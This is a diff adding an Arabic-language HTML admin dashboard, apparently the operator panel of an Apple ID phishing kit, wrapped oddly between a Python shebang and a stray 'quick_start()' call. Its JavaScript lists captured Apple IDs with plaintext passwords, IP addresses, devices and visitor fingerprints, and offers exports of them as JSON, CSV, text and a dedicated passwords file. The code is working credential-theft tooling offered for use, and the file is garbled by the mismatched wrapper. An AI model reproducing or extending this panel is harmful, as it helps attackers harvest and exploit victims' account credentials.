@@ -1,0 +1,945 @@
+#!/usr/bin/env python3<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <title>لوحة التحكم - إدارة بيانات Apple</title>
+    <style>
+        :root {
+            --primary: #007AFF;
+            --primary-dark: #0056CC;
+            --success: #34C759;
+            --danger: #FF3B30;
+            --warning: #FF9500;
+            --dark: #1D1D1F;
+            --light: #F5F5F7;
+            --gray: #8E8E93;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+        }
+        
+        .admin-header {
+            background: var(--dark);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            padding: 8px 16px;
+            background: var(--primary);
+            border-radius: 20px;
+            font-size: 14px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        
+        .stat-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--primary);
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            margin-top: 5px;
+        }
+        
+        .data-section {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 12px 16px;
+            text-align: right;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        th {
+            background: var(--light);
+            font-weight: 600;
+            color: var(--dark);
+        }
+        
+        tr:hover {
+            background: var(--light);
+        }
+        
+        .credential-password {
+            font-family: monospace;
+            background: #f0f0f0;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        
+        .actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        
+        .export-section {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            margin-top: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        
+        .export-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .export-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 15px;
+            background: var(--light);
+            border: 2px dashed var(--gray);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .export-btn:hover {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+        
+        .password-view {
+            display: none;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 5px;
+            font-family: monospace;
+        }
+        
+        .toggle-password-btn {
+            background: none;
+            border: none;
+            color: var(--primary);
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .search-box {
+            padding: 10px 15px;
+            border: 1px solid var(--light);
+            border-radius: 8px;
+            width: 300px;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 768px) {
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .actions {
+                flex-direction: column;
+            }
+            
+            .search-box {
+                width: 100%;
+            }
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--gray);
+        }
+        
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .refresh-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        
+        .live-badge {
+            background: var(--success);
+            color: white;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-header">
+        <div class="logo">
+            <span></span>
+            لوحة تحكم بيانات Apple
+        </div>
+        <a href="index.html" class="back-btn">← العودة للصفحة الرئيسية</a>
+    </div>
+    
+    <div class="container">
+        <div class="stats-grid" id="statsGrid">
+            <!-- سيتم ملؤها بالجافاسكريبت -->
+        </div>
+        
+        <div class="data-section">
+            <div class="section-header">
+                <div>
+                    <h2 class="section-title">📧 بيانات الدخول المسجلة</h2>
+                    <div class="live-badge">مباشر</div>
+                </div>
+                <input type="text" class="search-box" placeholder="بحث عن Apple ID..." onkeyup="filterCredentials()">
+            </div>
+            
+            <div class="table-container">
+                <table id="credentialsTable">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>الوقت</th>
+                            <th>Apple ID</th>
+                            <th>كلمة المرور</th>
+                            <th>عنوان IP</th>
+                            <th>الجهاز</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="credentialsBody">
+                        <!-- سيتم ملؤها بالجافاسكريبت -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="empty-state" id="emptyCredentials" style="display: none;">
+                <p>لا توجد بيانات دخول مسجلة حتى الآن</p>
+            </div>
+            
+            <div class="actions" style="margin-top: 20px;">
+                <button class="btn btn-danger" onclick="clearAllCredentials()">
+                    🗑️ حذف جميع البيانات
+                </button>
+                <button class="btn btn-primary" onclick="refreshData()">
+                    🔄 تحديث البيانات
+                </button>
+                <button class="btn btn-success" onclick="exportCredentials('json')">
+                    📥 تصدير كـ JSON
+                </button>
+            </div>
+        </div>
+        
+        <div class="data-section">
+            <div class="section-header">
+                <h2 class="section-title">👀 سجل الزيارات</h2>
+            </div>
+            
+            <div class="table-container">
+                <table id="visitsTable">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>الوقت</th>
+                            <th>عنوان IP</th>
+                            <th>المتصفح</th>
+                            <th>الدقة</th>
+                            <th>اللغة</th>
+                        </tr>
+                    </thead>
+                    <tbody id="visitsBody">
+                        <!-- سيتم ملؤها بالجافاسكريبت -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="empty-state" id="emptyVisits" style="display: none;">
+                <p>لا توجد زيارات مسجلة حتى الآن</p>
+            </div>
+        </div>
+        
+        <div class="data-section">
+            <div class="section-header">
+                <h2 class="section-title">📊 ملف Kelog (السجلات)</h2>
+            </div>
+            
+            <div class="table-container">
+                <table id="kelogTable">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>الوقت</th>
+                            <th>الإجراء</th>
+                            <th>التفاصيل</th>
+                        </tr>
+                    </thead>
+                    <tbody id="kelogBody">
+                        <!-- سيتم ملؤها بالجافاسكريبت -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="empty-state" id="emptyKelog" style="display: none;">
+                <p>لا توجد سجلات في ملف Kelog حتى الآن</p>
+            </div>
+            
+            <div class="actions" style="margin-top: 20px;">
+                <button class="btn btn-danger" onclick="clearKelog()">
+                    🗑️ حذف جميع السجلات
+                </button>
+                <button class="btn btn-success" onclick="exportKelog()">
+                    📥 تصدير ملف Kelog
+                </button>
+            </div>
+        </div>
+        
+        <div class="export-section">
+            <h2 class="section-title">📁 تصدير البيانات</h2>
+            <p>يمكنك تصدير جميع البيانات المسجلة بتنسيقات مختلفة</p>
+            
+            <div class="export-options">
+                <div class="export-btn" onclick="exportAllData('json')">
+                    <span>🔄</span>
+                    <span>تصدير كامل كـ JSON</span>
+                </div>
+                
+                <div class="export-btn" onclick="exportAllData('csv')">
+                    <span>📊</span>
+                    <span>تصدير كامل كـ CSV</span>
+                </div>
+                
+                <div class="export-btn" onclick="exportAllData('txt')">
+                    <span>📝</span>
+                    <span>تصدير كامل كـ نص</span>
+                </div>
+                
+                <div class="export-btn" onclick="downloadCredentialsFile()">
+                    <span>🔐</span>
+                    <span>تحميل ملف كلمات المرور</span>
+                </div>
+            </div>
+            
+            <div class="auto-refresh">
+                <label>
+                    <input type="checkbox" id="autoRefresh" checked>
+                    التحديث التلقائي كل 10 ثواني
+                </label>
+                <button class="refresh-btn" onclick="refreshData()">تحديث الآن</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // البيانات
+        let credentials = [];
+        let visits = [];
+        let kelog = [];
+        
+        // تحميل البيانات عند بدء التشغيل
+        document.addEventListener('DOMContentLoaded', function() {
+            loadAllData();
+            updateStats();
+            
+            // التحديث التلقائي
+            const autoRefresh = document.getElementById('autoRefresh');
+            if (autoRefresh && autoRefresh.checked) {
+                setInterval(() => {
+                    loadAllData();
+                    updateStats();
+                }, 10000);
+            }
+        });
+        
+        // تحميل جميع البيانات
+        function loadAllData() {
+            try {
+                // تحميل بيانات الدخول
+                const credsData = localStorage.getItem('apple_credentials');
+                credentials = credsData ? JSON.parse(credsData) : [];
+                
+                // تحميل الزيارات
+                const visitsData = localStorage.getItem('apple_visits');
+                visits = visitsData ? JSON.parse(visitsData) : [];
+                
+                // تحميل kelog
+                const kelogData = localStorage.getItem('kelog');
+                kelog = kelogData ? JSON.parse(kelogData) : [];
+                
+                // عرض البيانات
+                displayCredentials();
+                displayVisits();
+                displayKelog();
+                
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+        
+        // تحديث الإحصائيات
+        function updateStats() {
+            const stats = {
+                totalCredentials: credentials.length,
+                totalVisits: visits.length,
+                totalKelog: kelog.length,
+                lastHourCredentials: credentials.filter(c => {
+                    const credTime = new Date(c.time);
+                    const hourAgo = new Date(Date.now() - 3600000);
+                    return credTime > hourAgo;
+                }).length
+            };
+            
+            document.getElementById('statsGrid').innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-icon">📧</div>
+                    <div class="stat-number">${stats.totalCredentials}</div>
+                    <div class="stat-label">بيانات دخول</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">👀</div>
+                    <div class="stat-number">${stats.totalVisits}</div>
+                    <div class="stat-label">زيارات</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📊</div>
+                    <div class="stat-number">${stats.totalKelog}</div>
+                    <div class="stat-label">سجلات</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">⏰</div>
+                    <div class="stat-number">${stats.lastHourCredentials}</div>
+                    <div class="stat-label">آخر ساعة</div>
+                </div>
+            `;
+        }
+        
+        // عرض بيانات الدخول
+        function displayCredentials() {
+            const tbody = document.getElementById('credentialsBody');
+            const emptyState = document.getElementById('emptyCredentials');
+            
+            if (credentials.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            credentials.slice().reverse().forEach((cred, index) => {
+                const time = new Date(cred.time).toLocaleString('ar-SA');
+                const shortId = cred.appleId.length > 25 ? 
+                    cred.appleId.substring(0, 25) + '...' : cred.appleId;
+                const device = cred.userAgent ? 
+                    getBrowserName(cred.userAgent) : 'غير معروف';
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${cred.appleId}</td>
+                    <td>
+                        <span class="credential-password">••••••••</span>
+                        <button class="toggle-password-btn" onclick="togglePasswordView(${credentials.length - 1 - index})">
+                            👁️ عرض
+                        </button>
+                        <div class="password-view" id="passwordView${credentials.length - 1 - index}">
+                            ${cred.password}
+                        </div>
+                    </td>
+                    <td>${cred.ip || 'غير معروف'}</td>
+                    <td>${device}</td>
+                    <td>
+                        <button class="btn btn-danger" onclick="deleteCredential(${credentials.length - 1 - index})">
+                            حذف
+                        </button>
+                    </td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // عرض الزيارات
+        function displayVisits() {
+            const tbody = document.getElementById('visitsBody');
+            const emptyState = document.getElementById('emptyVisits');
+            
+            if (visits.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            visits.slice().reverse().forEach((visit, index) => {
+                const time = new Date(visit.time).toLocaleString('ar-SA');
+                const browser = visit.userAgent ? 
+                    getBrowserName(visit.userAgent) : 'غير معروف';
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${visit.ip || 'غير معروف'}</td>
+                    <td>${browser}</td>
+                    <td>${visit.screen || 'غير معروف'}</td>
+                    <td>${visit.language || 'غير معروف'}</td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // عرض kelog
+        function displayKelog() {
+            const tbody = document.getElementById('kelogBody');
+            const emptyState = document.getElementById('emptyKelog');
+            
+            if (kelog.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            kelog.slice().reverse().forEach((log, index) => {
+                const time = new Date(log.timestamp).toLocaleString('ar-SA');
+                const details = log.data ? 
+                    JSON.stringify(log.data).substring(0, 50) + '...' : '';
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${log.action || 'غير معروف'}</td>
+                    <td title="${JSON.stringify(log.data || {})}">
+                        ${details}
+                    </td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // الحصول على اسم المتصفح
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            return 'متصفح آخر';
+        }
+        
+        // تبديل عرض كلمة المرور
+        function togglePasswordView(index) {
+            const view = document.getElementById(`passwordView${index}`);
+            const btn = event.target;
+            
+            if (view.style.display === 'block') {
+                view.style.display = 'none';
+                btn.textContent = '👁️ عرض';
+            } else {
+                view.style.display = 'block';
+                btn.textContent = '🙈 إخفاء';
+            }
+        }
+        
+        // حذف بيانات دخول
+        function deleteCredential(index) {
+            if (confirm('هل تريد حذف هذه البيانات؟')) {
+                credentials.splice(index, 1);
+                localStorage.setItem('apple_credentials', JSON.stringify(credentials));
+                
+                // تسجيل في kelog
+                addToKelog('حذف بيانات دخول', { index });
+                
+                loadAllData();
+                updateStats();
+            }
+        }
+        
+        // حذف جميع بيانات الدخول
+        function clearAllCredentials() {
+            if (confirm('هل تريد حذف جميع بيانات الدخول؟ هذا الإجراء لا يمكن التراجع عنه.')) {
+                credentials = [];
+                localStorage.setItem('apple_credentials', JSON.stringify([]));
+                
+                // تسجيل في kelog
+                addToKelog('حذف جميع بيانات الدخول', {});
+                
+                loadAllData();
+                updateStats();
+                alert('تم حذف جميع بيانات الدخول بنجاح');
+            }
+        }
+        
+        // حذف kelog
+        function clearKelog() {
+            if (confirm('هل تريد حذف جميع السجلات؟')) {
+                kelog = [];
+                localStorage.setItem('kelog', JSON.stringify([]));
+                
+                loadAllData();
+                updateStats();
+                alert('تم حذف جميع السجلات بنجاح');
+            }
+        }
+        
+        // إضافة إلى kelog
+        function addToKelog(action, data) {
+            const logEntry = {
+                action: action,
+                data: data,
+                timestamp: new Date().toISOString()
+            };
+            
+            kelog.push(logEntry);
+            localStorage.setItem('kelog', JSON.stringify(kelog));
+        }
+        
+        // تحديث البيانات
+        function refreshData() {
+            loadAllData();
+            updateStats();
+            alert('تم تحديث البيانات');
+        }
+        
+        // تصدير البيانات
+        function exportAllData(format) {
+            const allData = {
+                credentials: credentials,
+                visits: visits,
+                kelog: kelog,
+                exportedAt: new Date().toISOString(),
+                totalRecords: credentials.length + visits.length + kelog.length
+            };
+            
+            let content, filename, mimeType;
+            
+            switch (format) {
+                case 'json':
+                    content = JSON.stringify(allData, null, 2);
+                    filename = `apple_data_${Date.now()}.json`;
+                    mimeType = 'application/json';
+                    break;
+                    
+                case 'csv':
+                    content = convertToCSV(allData);
+                    filename = `apple_data_${Date.now()}.csv`;
+                    mimeType = 'text/csv';
+                    break;
+                    
+                case 'txt':
+                    content = convertToTXT(allData);
+                    filename = `apple_data_${Date.now()}.txt`;
+                    mimeType = 'text/plain';
+                    break;
+                    
+                default:
+                    alert('تنسيق غير معروف');
+                    return;
+            }
+            
+            downloadFile(content, filename, mimeType);
+            
+            // تسجيل في kelog
+            addToKelog('تصدير البيانات', { format, filename });
+        }
+        
+        // تصدير بيانات الدخول فقط
+        function exportCredentials(format) {
+            const credsData = {
+                credentials: credentials,
+                exportedAt: new Date().toISOString(),
+                count: credentials.length
+            };
+            
+            let content, filename, mimeType;
+            
+            if (format === 'json') {
+                content = JSON.stringify(credsData, null, 2);
+                filename = `apple_credentials_${Date.now()}.json`;
+                mimeType = 'application/json';
+            } else {
+                alert('هذا التنسيق غير متاح حالياً');
+                return;
+            }
+            
+            downloadFile(content, filename, mimeType);
+            
+            // تسجيل في kelog
+            addToKelog('تصدير بيانات الدخول', { format, filename });
+        }
+        
+        // تصدير kelog
+        function exportKelog() {
+            const kelogData = {
+                logs: kelog,
+                exportedAt: new Date().toISOString(),
+                count: kelog.length
+            };
+            
+            const content = JSON.stringify(kelogData, null, 2);
+            downloadFile(content, `apple_kelog_${Date.now()}.json`, 'application/json');
+            
+            // تسجيل في kelog
+            addToKelog('تصدير ملف Kelog', {});
+        }
+        
+        // تحميل ملف كلمات المرور
+        function downloadCredentialsFile() {
+            if (credentials.length === 0) {
+                alert('لا توجد بيانات دخول لتصديرها');
+                return;
+            }
+            
+            let content = '🎯 بيانات دخول Apple - مُصدرة في ' + new Date().toLocaleString('ar-SA') + '\n\n';
+            content += '='.repeat(60) + '\n\n';
+            
+            credentials.slice().reverse().forEach((cred, index) => {
+                content += `📝 السجل ${index + 1}\n`;
+                content += '─'.repeat(40) + '\n';
+                content += `📧 Apple ID: ${cred.appleId}\n`;
+                content += `🔑 كلمة المرور: ${cred.password}\n`;
+                content += `🌐 عنوان IP: ${cred.ip || 'غير معروف'}\n`;
+                content += `🕒 الوقت: ${new Date(cred.time).toLocaleString('ar-SA')}\n`;
+                content += `📱 الجهاز: ${cred.userAgent?.substring(0, 100) || 'غير معروف'}\n`;
+                content += `📍 المنطقة الزمنية: ${cred.timezone || 'غير معروف'}\n`;
+                content += '\n' + '='.repeat(60) + '\n\n';
+            });
+            
+            content += `\n\nإجمالي السجلات: ${credentials.length}\n`;
+            content += `تاريخ التصدير: ${new Date().toLocaleString('ar-SA')}\n`;
+            
+            downloadFile(content, `apple_passwords_${Date.now()}.txt`, 'text/plain');
+            
+            // تسجيل في kelog
+            addToKelog('تحميل ملف كلمات المرور', { count: credentials.length });
+        }
+        
+        // تحويل إلى CSV
+        function convertToCSV(data) {
+            let csv = 'Type,AppleID,Password,IP,Time,UserAgent\n';
+            
+            // بيانات الدخول
+            data.credentials.forEach(cred => {
+                csv += `Credential,"${cred.appleId}","${cred.password}","${cred.ip || ''}","${cred.time}","${cred.userAgent || ''}"\n`;
+            });
+            
+            // الزيارات
+            data.visits.forEach(visit => {
+                csv += `Visit,"","","${visit.ip || ''}","${visit.time}","${visit.userAgent || ''}"\n`;
+            });
+            
+            return csv;
+        }
+        
+        // تحويل إلى نص
+        function convertToTXT(data) {
+            let text = '='.repeat(70) + '\n';
+            text += '🎯 بيانات Apple - التقرير الكامل\n';
+            text += '='.repeat(70) + '\n\n';
+            
+            text += '📊 الإحصائيات:\n';
+            text += '─'.repeat(40) + '\n';
+            text += `• بيانات الدخول: ${data.credentials.length}\n`;
+            text += `• الزيارات: ${data.visits.length}\n`;
+            text += `• السجلات: ${data.kelog.length}\n`;
+            text += `• الإجمالي: ${data.totalRecords}\n\n`;
+            
+            text += '📧 بيانات الدخول:\n';
+            text += '─'.repeat(40) + '\n';
+            data.credentials.forEach((cred, index) => {
+                text += `\n${index + 1}. ${cred.appleId}\n`;
+                text += `   كلمة المرور: ${cred.password}\n`;
+                text += `   IP: ${cred.ip || 'غير معروف'}\n`;
+                text += `   الوقت: ${new Date(cred.time).toLocaleString('ar-SA')}\n`;
+            });
+            
+            text += '\n👀 الزيارات:\n';
+            text += '─'.repeat(40) + '\n';
+            data.visits.forEach((visit, index) => {
+                text += `\n${index + 1}. ${visit.ip || 'غير معروف'}\n`;
+                text += `   الوقت: ${new Date(visit.time).toLocaleString('ar-SA')}\n`;
+                text += `   المتصفح: ${visit.userAgent?.substring(0, 50) || 'غير معروف'}\n`;
+            });
+            
+            text += '\n📊 سجلات Kelog:\n';
+            text += '─'.repeat(40) + '\n';
+            data.kelog.forEach((log, index) => {
+                text += `\n${index + 1}. ${log.action}\n`;
+                text += `   الوقت: ${new Date(log.timestamp).toLocaleString('ar-SA')}\n`;
+            });
+            
+            text += '\n' + '='.repeat(70) + '\n';
+            text += `مُصدر في: ${new Date(data.exportedAt).toLocaleString('ar-SA')}\n`;
+            text += '='.repeat(70);
+            
+            return text;
+        }
+        
+        // تنزيل الملف
+        function downloadFile(content, filename, mimeType) {
+            const blob = new Blob([content], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // فلترة بيانات الدخول
+        function filterCredentials() {
+            const searchTerm = document.querySelector('.search-box').value.toLowerCase();
+            const rows = document.querySelectorAll('#credentialsBody tr');
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(searchTerm) ? '' : 'none';
+            });
+        }
+        
+        // تحديث تلقائي للبيانات
+        document.getElementById('autoRefresh')?.addEventListener('change', function(e) {
+            if (e.target.checked) {
+                alert('تم تفعيل التحديث التلقائي كل 10 ثواني');
+            } else {
+                alert('تم إيقاف التحديث التلقائي');
+            }
+        });
+    </script>
+</body>
+</html>
+    quick_start()
